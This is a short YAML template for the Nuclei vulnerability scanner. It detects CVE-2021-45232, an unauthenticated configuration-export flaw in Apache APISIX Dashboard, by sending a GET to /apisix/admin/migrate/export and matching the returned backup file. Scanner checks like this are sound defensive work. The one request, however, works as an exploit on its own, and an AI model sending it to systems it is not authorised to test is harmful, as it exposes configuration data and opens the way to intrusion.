id: apache-apisix-dashboard-unauthorized-access

info:
  name: Apache APISIX Dashboard Unauthorized Access Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Attackers can access certain interfaces without logging in to Apache APISIX Dashboard, thus making unauthorized changes or obtaining configuration information such as Apache APISIX Route, Upstream, Service, etc., causing SSRF, malicious traffic proxies, or arbitrary code execution.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-45232
    - https://apisix.apache.org/zh/

http:
  - raw:
      - |
        GET /apisix/admin/migrate/export HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: header
        regex:
          - "Content-Disposition: attachment; filename=apisix-config.bak"
      - type: word
        part: body
        words:
          - "Consumers"
